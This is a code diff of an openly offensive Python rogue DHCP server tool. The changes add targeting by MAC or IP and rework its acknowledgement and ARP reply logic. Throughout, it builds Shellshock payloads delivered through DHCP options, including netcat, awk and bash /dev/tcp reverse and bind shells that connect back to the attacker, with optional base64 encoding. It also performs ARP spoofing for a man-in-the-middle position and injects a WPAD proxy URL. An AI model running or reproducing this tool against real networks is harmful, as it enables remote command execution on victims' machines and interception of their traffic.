@@ -5,7 +5,7 @@ from network import Ethernet_raw, DHCP_raw
 from sys import exit
 from argparse import ArgumentParser
 from ipaddress import IPv4Address
-from scapy.all import Ether, ARP, BOOTP, DHCP, sniff
+from scapy.all import Ether, ARP, BOOTP, DHCP, sniff, sendp
 from socket import socket, AF_PACKET, SOCK_RAW, inet_aton
 from base64 import b64encode
 from struct import pack
@@ -21,7 +21,7 @@ cEND = '\033[0m'
 
 _info = cINFO + '[*]' + cEND + ' '
 _error = cERROR + '[-]' + cEND + ' '
-_success = cSUCCESS + '[+] ' + cEND + ' '
+_success = cSUCCESS + '[+]' + cEND + ' '
 
 parser = ArgumentParser(description='DHCP Rogue server')
 
@@ -147,8 +147,13 @@ if 255 < args.shellshock_option_code < 0:
 
 print "\r\n"
 print _info + "Network interface: " + cINFO + current_network_interface + cEND
-print _info + "First offer IP: " + cINFO + args.first_offer_ip + cEND
-print _info + "Last offer IP: " + cINFO + args.last_offer_ip + cEND
+if args.target_mac is not None:
+    print _info + "Target MAC: " + cINFO + args.target_mac + cEND
+if args.target_ip is not None:
+    print _info + "Target IP: " + cINFO + args.target_ip + cEND
+else:
+    print _info + "First offer IP: " + cINFO + args.first_offer_ip + cEND
+    print _info + "Last offer IP: " + cINFO + args.last_offer_ip + cEND
 print _info + "DHCP server mac address: " + cINFO + dhcp_server_mac_address + cEND
 print _info + "DHCP server ip address: " + cINFO + dhcp_server_ip_address + cEND
 print _info + "Router IP address: " + cINFO + router_ip_address + cEND
@@ -213,6 +218,7 @@ def dhcp_reply(request):
     global shellshock_url
     global domain
     global your_mac_address
+    global current_network_interface
 
     SOCK = socket(AF_PACKET, SOCK_RAW)
     SOCK.bind((current_network_interface, 0))
@@ -289,6 +295,7 @@ def dhcp_reply(request):
             print _info + "Send inform ack response!"
 
         if request[DHCP].options[0][1] == 3:
+            dhcpnak = False
             requested_ip = offer_ip_address
             for option in request[DHCP].options:
                 if option[0] == "requested_addr":
@@ -302,6 +309,7 @@ def dhcp_reply(request):
                     nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip)
                     SOCK.send(nak_packet)
                     print _info + "Send nak response!"
+                    dhcpnak = True
 
             else:
                 if IPv4Address(unicode(requested_ip)) < IPv4Address(unicode(args.first_offer_ip)) \
@@ -310,67 +318,68 @@ def dhcp_reply(request):
                     nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip)
                     SOCK.send(nak_packet)
                     print _info + "Send nak response!"
+                    dhcpnak = True
 
-                else:
-                    net_settings = args.ip_path + "ip addr add " + requested_ip + \
-                                   "/" + str(IPAddress(network_mask).netmask_bits()) + " dev " + args.iface_name + ";"
+            if not dhcpnak:
+                net_settings = args.ip_path + "ip addr add " + requested_ip + \
+                               "/" + str(IPAddress(network_mask).netmask_bits()) + " dev " + args.iface_name + ";"
 
-                    global payload
+                global payload
 
-                    if args.shellshock_command is not None:
-                        payload = args.shellshock_command
+                if args.shellshock_command is not None:
+                    payload = args.shellshock_command
 
-                    if args.bind_shell:
-                        payload = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
-                                  "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"
+                if args.bind_shell:
+                    payload = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
+                              "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"
 
-                    if args.nc_reverse_shell:
-                        payload = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
-                                  your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
+                if args.nc_reverse_shell:
+                    payload = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
+                              your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
 
-                    if args.nce_reverse_shell:
-                        payload = "/bin/nc -e /bin/sh " + your_ip_address + " " + str(args.reverse_port) + " 2>&1 &"
+                if args.nce_reverse_shell:
+                    payload = "/bin/nc -e /bin/sh " + your_ip_address + " " + str(args.reverse_port) + " 2>&1 &"
 
-                    if args.bash_reverse_shell:
-                        payload = "/bin/bash -i >& /dev/tcp/" + your_ip_address + \
-                                  "/" + str(args.reverse_port) + " 0>&1 &"
+                if args.bash_reverse_shell:
+                    payload = "/bin/bash -i >& /dev/tcp/" + your_ip_address + \
+                              "/" + str(args.reverse_port) + " 0>&1 &"
 
-                    if payload is not None:
+                if payload is not None:
 
-                        if not args.without_network:
-                            payload = net_settings + payload
+                    if not args.without_network:
+                        payload = net_settings + payload
 
-                        if args.without_base64:
-                            shellshock_url = "() { :" + "; }; " + payload
-                        else:
-                            payload = b64encode(payload)
-                            shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + payload + ")"
-
-                    if shellshock_url is not None:
-                        if len(shellshock_url) > 255:
-                            print _error + "Len of command is very big! Current len: " + str(len(shellshock_url))
-                            shellshock_url = "A"
-
-                    global proxy
-                    if args.proxy is None:
-                        proxy = bytes("http://" + dhcp_server_ip_address + ":8080/wpad.dat")
+                    if args.without_base64:
+                        shellshock_url = "() { :" + "; }; " + payload
                     else:
-                        proxy = bytes(args.proxy)
+                        payload = b64encode(payload)
+                        shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + payload + ")"
 
-                    ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
-                    SOCK.send(ack_packet)
-                    print _info + "Send ack response!"
+                if shellshock_url is not None:
+                    if len(shellshock_url) > 255:
+                        print _error + "Len of command is very big! Current len: " + str(len(shellshock_url))
+                        shellshock_url = "A"
+
+                global proxy
+                if args.proxy is None:
+                    proxy = bytes("http://" + dhcp_server_ip_address + ":8080/wpad.dat")
+                else:
+                    proxy = bytes(args.proxy)
+
+                ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
+                SOCK.send(ack_packet)
+                print _info + "Send ack response!"
 
     if request.haslayer(ARP):
         if target_ip_address is not None:
             if request[ARP].op == 1:
                 if request[Ether].dst == "ff:ff:ff:ff:ff:ff" and request[ARP].hwdst == "00:00:00:00:00:00":
-                    print _info + "Gratuitous ARP MAC: " + request[ARP].hwsrc + " IP: " + request[ARP].pdst
+                    print _info + "ARP request src MAC: " + request[ARP].hwsrc + " dst IP: " + request[ARP].pdst
                     if request[ARP].pdst != target_ip_address:
-                        arp_reply = Ether(dst=request[ARP].hwsrc, src=your_mac_address) \
-                                    / ARP(hwsrc=your_mac_address, psrc=request[ARP].pdst,
-                                          hwdst=request[ARP].hwsrc, pdst=request[ARP].psrc, op=2)
-                        SOCK.send(arp_reply)
+                        sendp(Ether(dst=request[ARP].hwsrc, src=your_mac_address)
+                              / ARP(hwsrc=your_mac_address, psrc=request[ARP].pdst,
+                                    hwdst=request[ARP].hwsrc, pdst=request[ARP].psrc, op=2),
+                              iface=current_network_interface, verbose=False)
                         print _info + "Send ARP response!"
                     else:
                         print _success + "MiTM success!"
@@ -379,8 +388,6 @@ def dhcp_reply(request):
                         print _success + "Target IP: " + cSUCCESS + target_ip_address + cEND
                         print "\r\n"
                         SOCK.close()
-                        exit(0)
-
     SOCK.close()
 
 
